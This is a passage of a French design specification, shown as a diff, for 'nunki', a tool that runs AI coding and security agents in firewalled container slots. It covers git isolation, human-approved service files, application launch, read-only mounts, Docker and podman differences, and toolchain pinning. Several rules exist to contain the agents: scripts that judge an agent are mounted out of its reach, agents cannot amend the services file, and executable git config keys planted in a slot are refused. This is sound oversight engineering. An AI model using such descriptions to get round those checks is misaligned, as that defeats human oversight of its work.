+  gitlink est refusé par toute opération qui prendrait l'arbre du slot pour
+  arbre de travail (porte 1, `slot reset`, l'aiguillage), avec un message qui
+  nomme le chemin et dit que rien n'a été lancé. Ces opérations forment une
+  liste fermée (`ls-files`, `read-tree`, `update-index`, `clean`) et tournent
+  sans descente dans les sous-modules.
+- *Ce qui sort du slot est ce qui a été jugé.* De son slot, `nunki` ne prend
+  que la branche de la mission (`refs/heads/<branche>`, `--no-tags`) : le
+  miroir ne tient aucune étiquette du slot. `mission fetch` et `nunki push`
+  ne rapportent et ne publient que le commit que les portes et les verdicts
+  ont jugé, par son id ; ils refusent quand la branche du slot n'est pas ce
+  commit, et `push` vérifie de nouveau la pointe côté projet avant de
+  pousser.
+- *La base est celle de l'hôte.* Le lancement rafraîchit `origin/<base>`
+  depuis le chemin du projet tel que `nunki` le connaît, jamais depuis le
+  `remote.origin.url` du slot, et l'hôte l'enregistre
+  (`refs/nunki/origin/<base>`). Les portes ne lisent la base que là.
+- *Une mission part d'une base fraîche.* Quand `mission start` crée la
+  branche de mission, la branche de base du slot lui-même est amenée à celle
+  du projet, qui vient d'être lue — en avance rapide seulement : une base de
+  slot qui porte un commit que le projet n'a pas reste où elle est, et
+  `mission start` le dit. La branche sur laquelle le slot se trouve n'est
+  jamais déplacée sous son arbre.
+- `nunki check` porte une ligne, *l'hôte ne lance aucun git dans un slot*,
+  verte quand chaque slot se lit par son miroir, ambre quand un slot est
+  illisible depuis l'hôte, porte un gitlink, ou quand son `.git/config`
+  porte une clé que git exécuterait : elle nomme alors chaque clé et dit que
+  rien n'a été lancé. Ambre et non rouge, parce qu'aucune restriction n'est
+  rompue ; jamais vert, parce qu'un agent l'a posée.
+
+**Une mission part d'une base que le slot a rafraîchie.** Un slot est un
+clone, et un clone écrit son propre `dev` une fois : rien ne le rebouge
+ensuite. Sans rafraîchissement, chaque mission après la première partirait de
+la base telle qu'elle était le jour où le slot a été créé, et sa pull request
+s'ouvrirait contre une base qui a avancé. L'`origin` d'un slot étant le dépôt de la machine et non la forge, le
+rafraîchir est une opération locale qui ne demande pas de réseau ; elle est
+faite au moment où le slot passe sur la branche de la mission, jamais en cours
+de mission, et son échec est dit plutôt qu'avalé — partir d'une base qu'on n'a
+pas pu rafraîchir est exactement le silence que cela remplace.
+
+**Et une branche qui porte déjà du travail est reprise, jamais repositionnée.**
+`checkout -B` repointe une branche sur son point de départ : `checkout -B
+mission/x dev` sur une branche portant un commit de travail la laisse n'en
+porter aucun. Tout lancement qui trouverait le slot sur une autre branche — un
+humain qui regarde quelque chose, un changement de rôle qui n'est pas revenu —
+paierait le travail de la mission pour y retourner.
+
+**Les services et le lancement de l'application.** Il faut que quelqu'un
+relance le livrable pour la sécurité une fois le conteneur de l'intégrateur
+arrêté. Trois règles, et une seule mécanique quelle que soit la forme de la mission :
+
+1. **Les services sont levés une fois par slot**, sous un nom de projet
+   Compose stable, et **jamais arrêtés entre deux profils**. Seuls le sont
+   ceux que la mission déclare, et ce dont ils dépendent, **dans le rendu
+   qu'un humain a approuvé** : le fichier de services est à l'humain, et il
+   est lu au commit d'où part la branche de la mission — là où son `HEAD`
+   rejoint la base que l'hôte a enregistrée — par le miroir, jamais dans
+   l'arbre ni dans les commits de la branche. Aucun agent ne l'amende, pas
+   même un intégrateur dont le câblage le nomme : la porte 4 refuse tout
+   commit qui le touche, et une modification que les services demandent est
+   proposée dans `PR.md`, pour que l'humain la fasse. Tant qu'un commit
+   refusé est encore sur la branche, le profil système lève ce que l'humain a
+   approuvé, et la mission ne s'arrête pas sur un rendu que personne ne
+   lèvera. Il est relu dans un modèle fermé (par service : `image`,
+   `environment` en
+   littéraux explicites, `command`, `entrypoint`, `healthcheck`,
+   `depends_on`, `working_dir`, des volumes nommés ; au niveau supérieur,
+   `services` et des noms de volumes, sans valeur) ; toute autre clé, un
+   `networks` de premier niveau, une ancre, un alias, une balise, une clé de
+   fusion, une directive, un second document ou une clé en double refusent
+   le fichier entier, en le nommant. **Ce que le fichier porte, c'est
+   l'analyseur YAML qui le dit, jamais une seconde lecture du texte** : une
+   ancre, un alias ou une balise sont pris dans ses propres événements, sur
+   n'importe quel nœud, et refusent avec leur ligne — une lecture du texte
+   écrite à la main a été mesurée aveugle derrière un retour chariot seul,
+   ou derrière une apostrophe au milieu d'une valeur. Ce que les événements
+   ne disent pas — une directive, un second document, `...` — se lit à la
+   première colonne de chaque ligne, sans rien suivre d'une ligne à l'autre.
+   Et une ligne finit par LF ou CRLF : un NEL, un LS ou un PS brut, et un CR
+   que ne suit pas un LF, refusent le fichier où qu'ils soient. `nunki` émet
+   son propre rendu canonique, chaque `$` doublé pour que Compose
+   n'interpole rien ; c'est ce rendu qui est montré
+   (`nunki services --show`), haché, approuvé (`nunki services --approve
+   <empreinte>`, refusé si le rendu a changé depuis qu'il a été montré) et
+   levé. Un rendu que personne n'a approuvé ne lève aucun service et rend la
+   mission à l'humain. Une mission dont l'intégrateur ou l'agent de sécurité
+   lèvera ce profil pose la question à son lancement, quand l'humain est là :
+   `nunki mission start` lit le fichier sur la branche de la mission, au
+   commit d'où elle part, et ne démarre rien sur un rendu que personne n'a
+   approuvé, qu'il montre. Les `ports` sont retirés du rendu : l'agent joint un
+   service par son nom, et un port publié entrerait en collision d'un slot
+   à l'autre. Avant de lever un profil, les conteneurs du projet dont la
+   définition n'est pas celle qui est approuvée sont arrêtés, jamais leurs
+   volumes ; l'étiquette de conteneur `nunki.services` est à `nunki`. L'état que
+   l'intégrateur a posé — migrations jouées, fixtures — survit ; seul le
+   conteneur d'agent change. Un service que le profil lève, qui avait un
+   conteneur avant le lancement et qui, après un `up` en échec, en est sorti
+   sur un code autre que 0, est dit en une ligne : son conteneur, ce code,
+   et la commande du moteur qui retire ce conteneur sans aucun de ses
+   volumes. `nunki` ne la lance jamais lui-même : ce que le conteneur
+   gardait dans son propre système de fichiers et dans les volumes anonymes
+   de son image ne reviendrait pas.
+2. **Lancer l'application n'est le travail d'aucun agent : c'est `nunki` qui la
+   démarre**, par `nunki exec`, dans le profil de l'agent qui va la tester ou
+   l'attaquer, avant de lancer cet agent. Il le fait à partir d'un **script
+   de lancement qui appartient au projet** : le fragment de stack en fournit
+   un par défaut (`run.sh` : comment on démarre une application de cette
+   stack), `nunki.yaml` peut le remplacer, l'en-tête de mission peut le
+   préciser, et quand l'intégrateur est appelé, ce script fait partie de son
+   câblage — il peut l'amender et le commite, et c'est cette version que
+   `nunki` utilise ensuite. Un projet sans exécutable (une bibliothèque) déclare
+   `run: none`, et l'agent sécurité travaille sur le code et l'artefact de
+   build.
+
+   | forme | qui démarre l'application, à partir de quoi |
+   |---|---|
+   | intégration puis sécurité | `nunki` la démarre pour l'intégrateur, puis la redémarre pour la sécurité, avec le script tel que l'intégrateur l'a commité, sur les mêmes services jamais arrêtés |
+   | sécurité seule, sans services | `nunki` la démarre pour la sécurité avec le script de la stack ou du projet ; `run: none` pour une bibliothèque |
+   | code seul | rien à démarrer, personne n'est appelé |
+
+   **Ce que le script de lancement ne doit pas faire.**
+   `nunki` lance ce script détaché dans le conteneur de l'agent et reconnaît le
+   processus **à l'identifiant posé sur sa ligne de commande** — la même
+   mécanique que pour un run de harnais ou une campagne de mutation. Un
+   script qui finit par `exec` remplace son propre processus, donc sa ligne
+   de commande, donc l'identifiant : la vérification de vivacité répond
+   « terminée » sur une application qui tourne. Le fragment de stack le dit
+   en commentaire et n'`exec` pas, et le test live joue les deux formes côte
+   à côte pour que la différence soit mesurée et non affirmée.
+
+   **Le bloc `volumes:` du projet est fusionné avec ceux du slot** : sous
+   Compose v5.1.2, un service qui nomme un volume que le
+   document ne déclare pas rend le projet entier invalide (`service "db"
+   refers to undefined volume dbdata: invalid compose project`). Et c'est
+   précisément là qu'un projet range ce qui doit survivre à une bascule de
+   profil, donc l'oublier reviendrait à jeter l'état que la règle 1 existe
+   pour garder. Un projet ne peut pas nommer un volume en `nunki-<slot>-` :
+   ceux-là sont au slot, et le lui donner serait lui tendre le cache de
+   compilation ou les sessions du harnais.
+
+   **Le projet Compose porte la session, puis le slot** : `nunki-<session>-<slot>`,
+   les huit premiers caractères de l'identifiant que `sessions.json` donne au
+   dépôt. Le slot seul ne suffit pas : deux projets qui ont chacun un slot
+   `one` seraient **le même projet Compose** — un seul jeu de conteneurs, un
+   seul réseau, un seul volume de harnais portant les sessions des deux
+   projets. Lancer une mission sur l'un recréerait les conteneurs de l'autre
+   sous un agent en train de travailler, et le `locks/one` de chaque HQ dirait
+   que le slot est libre. La session d'abord, pour
+   qu'un `docker ps` groupe les conteneurs d'un projet.
+
+   La sécurité attaque ainsi exactement ce que l'intégrateur a validé quand
+   il est passé, et sinon ce que le projet déclare comme façon normale de
+   démarrer. Aucun agent ne décide comment on lance l'application, et il n'y
+   a qu'un mécanisme à coder.
+3. **L'arbre reste en lecture seule pour la sécurité**, et c'est le fragment
+   de stack qui déclare les **répertoires que l'exécution doit pouvoir
+   écrire** (`target/`, `.next/`, caches), montés comme volumes propres au
+   profil. Ce qui n'est pas déclaré reste fermé.
+
+   **Deux conditions, et il faut les deux.** Un
+   volume nommé monté sur un sous-chemin d'un bind en lecture seule :
+
+   - **prend sa propriété de l'image** — si l'image ne porte pas ce
+     répertoire, le volume naît à `root` et un conteneur sans capacité ne
+     peut rien y faire ; s'il le porte et qu'il est `chown`é à l'agent, le
+     volume arrive à l'agent. C'est donc la couche `nunki` de l'image qui crée
+     ces répertoires, à partir de `writable.txt` ;
+   - **exige que le point de montage existe aussi dans la source du bind**,
+     sinon le conteneur ne démarre pas du tout (`create mountpoint for
+     /work/tree/target: read-only file system`). `nunki` crée donc le
+     répertoire vide dans l'arbre du slot avant de lever le profil — c'est
+     un répertoire que le projet ignore, invisible à `git status`, donc la
+     porte 1 reste verte.
+
+   La profondeur ne change rien : `packages/web/node_modules` se comporte
+   comme `target`. Et comme une image périmée porte le même tag, `nunki` ne peut
+   pas voir la différence avant de lever : il **demande au conteneur levé**
+   si ces répertoires sont réellement inscriptibles, et nomme
+   `nunki slot rebuild` sinon. Sans cette question, la seule mesure qui compte
+   ici ne serait garantie par rien à l'exécution.
+
+**La forme déclarative des conteneurs : Compose, généré par `nunki`.** Compose est un plugin de la
+CLI, pas une notion de l'API : « un Compose levé par l'API » n'existe pas.
+Les deux issues pures étaient mauvaises — appeler `docker compose` sur un
+fichier écrit à la main enferme dans une CLI, et un format propre réinvente
+Compose à moitié. La voie retenue : **Compose reste le format**, connu de
+tous et celui dans lequel le projet écrit ses propres services ; **`nunki`
+génère le fichier** de chaque profil à chaque lancement, à partir de
+`nunki.yaml`, du fragment de stack et de l'en-tête du `MISSION.md` (image,
+utilisateur et uid, montages, variables, réseau, capacité donnée à
+l'entrypoint, liste blanche calculée, services du projet inclus) — et n'y
+touche plus jusqu'au lancement suivant, à une exception près : `nunki verify`
+y ajoute une base d'avis que l'hôte a remplie après coup (porte 8, 4.4) ; puis un
+**adaptateur de moteur** l'exécute — `docker compose` ou
+`podman-compose`, et le chemin de la socket — et ne fait rien d'autre. `nunki`
+n'invente aucun format, et la frontière de moteur subsiste, réduite à ce
+qu'elle doit être. Le devcontainer et sa CLI en Node ne sont plus une
+dépendance ; `devcontainer.json` survit en vue IDE du profil interactif.
+
+Les micro-VM restent une option de second rideau, pour le seul rôle qui
+attaque, le jour où `nunki` tournerait sur un Linux natif sans VM devant ses
+conteneurs, ou pour un livrable dont les données le justifient. Sur macOS et
+sous WSL, la VM de Docker Desktop est déjà une frontière entre les conteneurs
+et la machine ; ce qui compte tout de suite est de ne jamais donner à un
+conteneur d'agent ce qui rend l'évasion triviale (4.1 bis).
+
+**Le moteur est écrit en Rust.** Un seul fichier bash de plusieurs milliers
+de lignes serait illisible et impossible à tester unitairement. Ce que le
+choix engage : un binaire unique `nunki`, sans runtime à installer sur la
+machine de l'humain ; des types pour les états d'une mission, d'un slot et
+d'un verdict, qui rendent les transitions du flux 4.5 vérifiables à la
+compilation ; des tests unitaires sur le moteur et des tests d'intégration
+contre de vrais `git` et un vrai Compose. Ce que le moteur
+continue de déléguer au shell : les fragments par stack (batterie, mutation,
+caches, domaines) et les scripts que les conteneurs exécutent, parce qu'ils
+tournent dans le conteneur et non dans `nunki`.
+
+Pourquoi un langage typé pour « lancer des commandes » : parce que `nunki` n'est pas un script qui enchaîne des
+commandes, c'est un programme qui **tient un état** — quel slot porte quelle
+mission, sur quel `HEAD`, avec quel verdict de quel rôle, combien de volets
+joués — et qui **lit des sorties** (JSON du harnais, résultat de mutation) et
+**décide en attendant** (`watch`, délais). Le flux 4.5 est une machine à
+états ; les types la font respecter à la compilation, les tests la vérifient
+sans conteneur, et une sortie de forme inattendue devient une erreur au lieu
+d'un silence. Rust plutôt que Python achète en plus le binaire unique sans
+runtime ; il coûte du temps d'écriture, et c'est accepté.
+
+**Les slots sont construits par `nunki`, pas repris d'un outil tiers.** Des outils existent qui isolent un agent dans un
+clone et un conteneur (section 5), mais aucun n'a été conçu avec la
+contrainte qui fait la sécurité du slot — un `origin` inatteignable depuis le
+conteneur — et deux des quatre sont morts ou mourants. Un slot, c'est un
+`git clone` local, des conteneurs levés par le Compose généré, et des volumes
+nommés ; la doctrine autour est ce qui compte, et elle est ici. Ce qu'on perd
+en construisant : la vue d'ensemble graphique que ces outils offrent, absente
+de `nunki` au départ.
+
+**Le moteur de conteneurs est derrière une frontière**, comme le harnais,
+**et cette frontière n'est pas minuscule.** Voici ce qui diffère réellement
+entre `docker compose` et `podman-compose` pour tenir ce que 4.1 bis et les
+profils exigent. L'adaptateur de moteur porte, et lui seul :
+
+| ce qui diffère | Docker Compose | podman-compose |
+|---|---|---|
+| partage d'espace réseau pour le sidecar | l'agent rejoint le pare-feu : `network_mode: "service:<pare-feu>"` **sur le service d'agent** (voir le sens, plus bas) | seulement `container:<nom>`, nom généré à connaître avant |
+| mappage des utilisateurs en mode sans root | sans objet | `userns_mode: keep-id`, propre à Podman |
+| joindre l'hôte sur déclaration | `host.docker.internal` via `host-gateway` | `host.containers.internal` natif, `host-gateway` mal supporté |
+| inclusion des services du projet | `include:` fonctionne | `include:` plante — donc **`nunki` émet lui-même le rendu** des services du projet, relu dans un modèle fermé et approuvé (4.2, règle 1), dans le Compose généré, sur les deux moteurs |
+| conditions de démarrage entre services | `service_healthy`, `service_completed_successfully` | la première buguée, la seconde absente |
+| profils Compose | fiables | bugués — donc **un fichier par profil** avec un nom de projet stable, jamais `profiles:` |
+| adresse du résolveur | dépend du **mode réseau**, pas de la plateforme | idem, autres adresses (aardvark, pasta, slirp) |
+| commande et socket | `docker compose`, socket détectée | `podman-compose`, socket détectée |
+
+**Le sens du partage d'espace réseau, vérifié par exécution.** Si
+`network_mode: "service:<agent>"` est écrit sur le sidecar — le pare-feu
+rejoint l'agent —, sur Docker Compose v5.1.2 et dans ce sens, **l'agent démarre le premier** et le sidecar second (il en dépend),
+donc l'agent a un réseau avant que la moindre règle soit posée, ce qui
+contredit 4.1 bis §2. Le sens juste est l'inverse : **le pare-feu possède
+l'espace réseau, l'agent le rejoint** (`network_mode: "service:<pare-feu>"`
+sur le service d'agent) et l'attend par `depends_on: { <pare-feu>: {
+condition: service_healthy } }`. Mesuré dans ce sens : le sidecar pose ses
+règles, passe healthy, et l'agent démarre ensuite — avec `cap_drop: [ALL]`,
+`no-new-privileges` et l'uid de l'hôte, que le partage d'espace réseau
+n'affecte pas. **Conséquence pour le générateur** : Compose refuse
+`network_mode` et `networks` sur le même service (« mutually exclusive
+`network_mode` and `networks`: invalid compose project », mesuré) — donc
+c'est **le pare-feu** qui s'attache au réseau des services du projet et qui
+porte les ports, jamais l'agent.
+
+**Le changement de profil ne touche pas aux services, vérifié par exécution.** Sous un nom de projet stable, lever un second fichier qui
+**redéclare les services du projet à l'identique** laisse leurs conteneurs
+intacts — même identifiant, même heure de démarrage (mesuré). Un fichier qui
+les **omet** ne les arrête pas non plus, mais Compose les signale comme
+« orphelins » à chaque commande. Donc la règle du générateur : **le profil
+système redéclare à l'identique les services que la mission déclare**, et
+`nunki` ne passe jamais `--remove-orphans` ; le profil mission n'en déclare
+aucun. Les services restent levés d'un profil à l'autre parce que `nunki`
+ne retire jamais d'orphelin et que l'arrêt avant levée garde les
+définitions approuvées. Arrêter le conteneur d'agent du profil
+précédent reste un geste explicite de l'adaptateur de moteur.
+
+Une bonne part de ces différences sont des bugs ouverts de `podman-compose`,
+pas des choix de conception. D'où : **la première version ne vise que
+Docker** — Docker Desktop sur macOS et sous WSL, Docker Engine dans WSL. **Podman est une cible seconde**,
+documentée par ce tableau pour qui l'implémentera, avec la note honnête que
+tant que `podman-compose` porte ces bugs, son adaptateur devra contourner ou
+générer un Compose plus simple. Rien d'autre du moteur ne remonte dans `nunki`.
+
+**La base des images, et pourquoi elle n'est pas la même partout.**
+
+- **Les images de stack — les conteneurs d'agent — sont sur une base
+  glibc** (Debian slim). musl coûte trop cher là où le travail a lieu : les
+  wheels `manylinux` de Python sont glibc et retombent sinon sur une
+  compilation depuis les sources, les binaires natifs préconstruits de Node
+  visent glibc, Rust change de cible, et la pile de thread par défaut de musl
+  (128 Kio contre 8 Mio) fait tomber des logiciels qui ne s'y attendent pas.
+- **Le sidecar pare-feu est sur Alpine**, avec son dnsmasq compilé (4.1 bis).
+  Mesuré : `debian:bookworm-slim` porte des vulnérabilités critiques et
+  hautes **dont aucune n'est corrigeable** — Debian les marque « ne sera pas
+  corrigé » — et le sidecar fini sur Debian en accumule davantage, pour
+  154 Mo ; sur Alpine, le même sidecar est à 0 critique et 0 haute, pour
+  27 Mo.
+
+L'asymétrie est assumée parce que le calcul de risque n'est pas le même : le
+conteneur d'agent n'a **aucune capacité** et vit derrière le pare-feu, tandis
+que le sidecar détient `NET_ADMIN` et **son socket d'écoute est joignable
+depuis l'espace réseau que l'agent partage**. C'est le pire endroit du système
+pour accumuler des CVE, et le seul où l'on paie une étape de build pour les
+éviter. Ce que ça coûte : deux profils de vulnérabilités à suivre au lieu
+d'un. **Ils sont surveillés dans le temps** : chaque lundi, et sur une pull request qui touche ce dont les
+images sont faites, la CI construit les trois images comme un projet les
+obtient (`nunki init`, puis `nunki slot rebuild`) et les passe à Trivy, épinglé
+par version et par somme de contrôle plutôt qu'en action tierce. Elle est
+rouge pour une vulnérabilité critique ou haute **qui a un correctif** ; les
+autres sont listées sans bloquer, puisque personne ne peut agir sur une
+CVE sans correctif.
+
+**Les fragments de stack.** Un dossier par stack dans le home du projet,
+`~/.nunki/<projet>/stacks/<nom>/`, **jamais dans le dépôt** : l'outillage de développement n'a pas à vivre dans
+l'historique d'un projet, pas plus que les réglages d'un éditeur. Les
+fragments appartiennent au projet orchestré, jamais à `nunki` (4.1 bis). Les
+scripts qu'un conteneur exécute — `prepush.sh`, `system.sh`, `mutation.sh`,
+`run.sh` — y sont **montés en lecture seule, fichier par fichier**, à
+`/work/stack/` : ce qui juge l'agent est hors de sa portée par construction, et
+plus seulement par une porte. Le Dockerfile, `allow.txt` et `writable.txt` ne
+sont lus que sur l'hôte. Le dossier porte :
+un Dockerfile (étapes d'image), `allow.txt` (domaines des dépendances),
+`Dockerfile.addon` et `Dockerfile.stages` (ce que la stack ajoute sur l'image
+d'une autre — « plusieurs stacks », ci-dessous), `prepush.sh` (section de
+batterie), `system.sh` (les tests système de
+l'intégrateur), `mutation.sh` (commande de mutation, qui reçoit dans
+`NUNKI_BASE` le point de fourche de la branche — porte 7),
+`run.sh` (comment on démarre une application de cette stack, par défaut),
+`writable.txt` (les répertoires qu'une exécution doit pouvoir écrire quand
+l'arbre est en lecture seule), `caches.txt` (les caches que la chaîne d'outils
+tient **hors de l'arbre** — registre de paquets, cache de compilation — un
+chemin absolu par ligne, chacun gardé comme volume nommé par slot ; c'est la
+stack qui les nomme, parce qu'un chemin comme `/home/agent/.cargo/registry`
+monté par le cœur pour toute stack donnerait à un projet Python un volume
+`cargo` vide et aucun pour pip), `perimeter.yaml` (zone de
+tests pour une mission de tests), `advisories.txt` (où la base d'avis de la
+stack vit **sur l'hôte**, puis la commande qui la remplit ; fichier plat,
+jamais monté ; la base est à l'outil et remplie par l'hôte, jamais par
+`nunki` — voir la porte 8 en 4.4), `security.sh`
+(audit de dépendances, scan de secrets, analyse statique — la sécurité
+mécanique, porte 8, définie en 4.4), `versions.txt` (où le dépôt épingle les
+versions de sa chaîne d'outils — ci-dessous). Un
+fragment est un script ou un fichier plat, jamais du code de `nunki`. Les trois
+premières stacks sont Rust, Python et Next.js. Les trois sont écrites, et `nunki init` refuse un nom qu'il ne connaît pas plutôt
+que de laisser un répertoire vide qui se lit comme configuré.
+
+**Les versions sont celles du dépôt, pas celles du fragment.** Le Dockerfile d'un fragment porte des valeurs par
+défaut — `RUST_VERSION=stable`, `python:3.12`, `node:22`, une version de
+pnpm. Un dépôt qui épingle autre chose demande à sa chaîne d'outils une
+version que l'image n'a pas, et la chaîne d'outils part la chercher derrière
+un pare-feu qui ne nomme aucun de ses hôtes : un `rust-toolchain.toml` qui
+épingle une version exacte et la cible `wasm32-unknown-unknown` échoue sur une
+image qui porte `stable`.
+
+- **Le fragment dit où lire, le cœur sait lire.** `versions.txt` tient une
+  ligne par argument de build du Dockerfile : l'argument, le fichier du dépôt,
+  une clé dans un `.toml` ou un `.json` (`-` pour un fichier texte), et
+  un motif facultatif dont `{}` est la version (`pnpm@{}` tire `11.15.0` de
+  `pnpm@11.15.0+sha512.…`). Dans un fichier texte, la version est sur la
+  première ligne qui commence comme le motif : un fichier de verrouillage
+  nomme chaque paquet résolu, un par ligne, et c'est ainsi que l'image Next
+  prend les navigateurs de la version de Playwright que le projet a résolue
+  (`'@playwright/test@{}':` dans `pnpm-lock.yaml`), et non ceux qu'elle
+  porterait par défaut — une batterie système refuse de démarrer sur un
+  écart, et le CDN de Playwright n'est sur aucune liste. Sans motif, ou avec
+  un motif qui commence par la version, c'est la première ligne, comme dans
+  `.nvmrc`. Le cœur connaît trois formats de fichier et aucune
+  stack : lire `Cargo.toml` ou `package.json` depuis le cœur, c'est la stack de
+  retour dans le cœur (3.2). Plusieurs lignes pour un argument sont essayées
+  dans l'ordre, et la première version **exacte** gagne ; un intervalle
+  (`>=20`, `^3.12`) ou un alias (`lts/iron`) est refusé, puisque le traduire
+  en étiquette d'image serait deviner. Rien d'exact : la valeur par défaut du
+  Dockerfile reste, et `nunki slot rebuild` le dit, argument par argument, avec
+  la raison pour chaque source.
+- **Lu à `nunki slot rebuild`, jamais à `nunki init`.** Un fragment ne se met
+  jamais à jour tout seul ; une version figée dedans à `init` serait fausse au
+  premier mouvement du dépôt. Les valeurs lues sont passées en `--build-arg`
+  et inscrites sur l'image dans l'étiquette `nunki.versions` : le tag seul ne
+  dit pas quelle chaîne d'outils est dedans.
+- **Un lancement compare l'image à ce que la branche du slot épingle**, et
+  `nunki slot rebuild --slot <nom>` lit les versions dans l'arbre de ce slot,
+  sur la branche de sa mission, au lieu du dépôt. Sans cela, une branche qui
+  change une version épinglée ne pourrait plus être servie par aucune image,
+  pas même pour le run qui doit la remettre : l'image construite depuis le
+  dépôt porte l'ancienne, et le lancement la refuse. Le refus nomme la
+  commande avec le nom du slot. L'image reste partagée par les slots d'un
+  projet : un autre slot dont la branche épingle autrement est refusé à son
+  lancement suivant, et le dit.
+- **Un argument que le Dockerfile ne déclare pas est refusé.** Le moteur
+  l'abandonnerait avec un avertissement que personne ne lit, et l'image
+  garderait sa valeur par défaut — l'échec même que ce fichier existe à
+  empêcher. `nunki slot rebuild` refuse, `nunki check` est rouge, et les deux
+  nomment la procédure : c'est le cas d'un fragment écrit avant
+  `versions.txt`, que rien ne met à jour.
+- **Deux gardes.** `nunki check` compare ce que le dépôt épingle à ce que
+  l'image porte, rouge s'ils diffèrent ou si l'image a été construite avant
+  que `nunki` ne l'inscrive, « non vérifié » si l'image n'existe pas ou si le
+  moteur ne répond pas. Et `mission start` refuse de lancer un agent quand
+  l'arbre du slot, **sur la branche de la mission**, épingle autre chose que
+  l'image : la base ou un commit du codeur a pu bouger depuis la construction,
+  et le premier `cargo` du run se perdrait dans un téléchargement refusé.
+- **Ce que chaque stack lit.** Rust : `rust-toolchain.toml` — canal,
+  composants, cibles ; l'image ajoute toujours `clippy` et `rustfmt`, dont la
+  batterie a besoin. Python : `.python-version` ; `requires-python` n'est pas
+  lu, c'est un intervalle. Next.js : `.nvmrc`, puis `.node-version`, puis
+  `engines.node` s'il est exact, et `packageManager` pour pnpm. Les outils de
+  `nunki` lui-même — trufflehog, osv-scanner, Playwright — restent épinglés
+  par le fragment : ils ne sont pas au dépôt.
+
+**Plusieurs stacks dans un projet** (l'hybride ci-dessous plutôt qu'une image
+entièrement générée par `nunki`). Un dépôt peut porter du Rust à la racine et un
+Next.js dans `frontend/` ; le codeur, dans **un** conteneur, doit pouvoir
+lancer `cargo` et `pnpm` — un frontend peut dépendre d'un paquet wasm que
+`wasm-pack` construit avant `pnpm install`.
+
+- **La déclaration.** `stacks:` accepte un nom (`- rust`, à la racine) ou un
+  nom et son répertoire (`- next: frontend`) ; `nunki init --stack
+  next=frontend` l'écrit. Un répertoire absolu ou contenant `..` est refusé,
+  un nom déclaré deux fois aussi. La **première** stack est la principale.
+- **Une image par projet, celle de la principale, complétée.** Chaque fragment
+  porte, en plus de son Dockerfile autonome, un `Dockerfile.addon` — ce qu'il
+  ajoute sur l'image d'une autre stack, en partant de l'utilisateur agent et
+  en y revenant — et, s'il copie depuis une image officielle, un
+  `Dockerfile.stages`. Les étapes vont **avant** le premier `FROM` de la
+  principale et tous les `ARG` globaux avant toute étape : `COPY --from` ne
+  développe pas de variable (mesuré), et un `ARG` écrit après
+  un `FROM` appartient à cette étape. Les compléments suivent, dans l'ordre
+  déclaré. L'image porte le nom de la principale ; `slot rebuild --stack`
+  n'accepte qu'elle.
+- **Le runtime est copié depuis l'image officielle, pas réinstallé.** Node
+  vient de `node:<version>-bookworm-slim`, Python de
+  `python:<version>-slim-bookworm` avec les bibliothèques Debian qu'il lie et
+  `ldconfig` ; Rust reste installé par rustup, en agent. Python réinstallé par `uv python install` embarque OpenSSL et
+  sqlite liés en statique, que le scan d'image ne voit pas et qu'`apt` ne
+  corrige pas ; copié depuis l'image officielle, le scan ne trouve rien de
+  corrigeable. Les étapes qu'une stack et son complément partagent sont un
+  seul texte dans `nunki init`, et un test vérifie qu'elles sont identiques
+  octet pour octet dans les deux fichiers.
+- **Les chemins d'une stack sont relatifs à son répertoire.** `versions.txt`
+  se lit dans le répertoire de la stack (`frontend/package.json`) ;
+  `writable.txt` y est préfixé, en un seul endroit, pour que le point de
+  montage de l'image, le répertoire amorcé et le volume ne divergent pas. Un
+  argument lu par deux stacks est refusé : une valeur l'emporterait pour les
+  deux. `nunki check` lit chaque stack contre ce qu'elle met dans l'image —
+  son Dockerfile pour la principale, son complément pour les autres — et
+  compare l'image unique à l'union de ce que le dépôt épingle.
+- **Les portes jouent chaque stack, dans son répertoire.** Les scripts de la
+  principale restent montés à `/work/stack/`, ceux des autres à
+  `/work/stack-<nom>/`, et chaque base d'avis à `/nunki/advisories` ou
+  `/nunki/advisories-<nom>`. La porte 6 (et la batterie système de
+  l'intégrateur) et la porte 8 lancent le script de chaque stack depuis son
+  répertoire de la copie de `HEAD`, **toutes**, même quand la première est
+  rouge : l'agent renvoyé apprend tout d'un coup. Non jouée quelque part, la
+  porte est non jouée ; rouge quelque part, elle est rouge, et chaque ligne
+  dit quelle stack l'a dite. Un répertoire absent de la copie est rouge.
+  La campagne de mutation (porte 7) donne chaque chemin touché à la stack
+  dont le répertoire le contient — le plus profond — relativement à lui, et
+  ne lance pas une stack que la branche n'a pas touchée ; les identifiants
+  sont préfixés du nom de la stack, les fichiers de son répertoire, et
+  `{"campaign":"done"}` n'est dit qu'une fois, si chaque stack l'a dit. Le
+  périmètre du codeur est l'union des `allow.txt`, les caches et les
+  répertoires inscriptibles l'union de ceux des stacks. Un projet à une seule
+  stack ne voit rien bouger : mêmes chemins, mêmes commandes.
+
+**Les fragments suivent nunki.** Un fragment est copié une fois par
+`nunki init`, qui ne réécrit rien : sans règle de rafraîchissement, un
+correctif de modèle n'atteindrait aucun projet existant, et la seule façon de
+rafraîchir, effacer puis relancer `init`, effacerait aussi les retouches du
+projet. La règle qui tranche entre les deux :
+
+- **Un fichier n'est à nunki que si ses octets sont des octets que nunki a
+  livrés.** Le binaire porte la liste de tout ce qu'un `nunki init` a jamais
+  écrit, reconstruite depuis l'historique (`scripts/shipped-fragments.sh`,
+  un test rouge tant que la version du jour n'y est pas). **Rien n'est
+  enregistré chez le projet** : un registre lu sur disque aurait pu
+  revendiquer une retouche humaine — exactement le « manifeste, checksums,
+  `.new` » abandonné en tête de cette spécification, où chaque règle de
+  propriété était un endroit où détruire du travail en silence. Ici, une
+  empreinte absente de la liste ne peut que faire garder le fichier.
+- **Intact et ancien : `nunki init --refresh` le remplace**, avec le mode
+  qu'il doit avoir ; un `init` simple le garde et dit que `--refresh` le
+  remplacerait, et `nunki check` est rouge pour lui — un rouge que la
+  commande nommée corrige. Le rafraîchissement est refusé tant qu'un
+  conteneur du projet tourne (les scripts y sont montés fichier par fichier
+  et l'ancien resterait monté) et tient tous les slots du projet pendant
+  qu'il écrit. `Dockerfile`, `Dockerfile.addon`, `Dockerfile.stages` et
+  `versions.txt` bougent ensemble : si le projet en a réécrit un, les autres
+  attendent.
+- **Réécrit par le projet : il est au projet.** Jamais remplacé ; la version
+  du jour est déposée à côté, `<fichier>.nunki` (3.3, règle 3), et réécrite
+  quand elle vieillit. `nunki check` le dit sans rouge : une réécriture
+  voulue — la batterie d'un projet calquée sur sa CI — ferait sinon un rouge
+  que personne ne peut lever. Le texte de nunki enregistré en CRLF est dit à
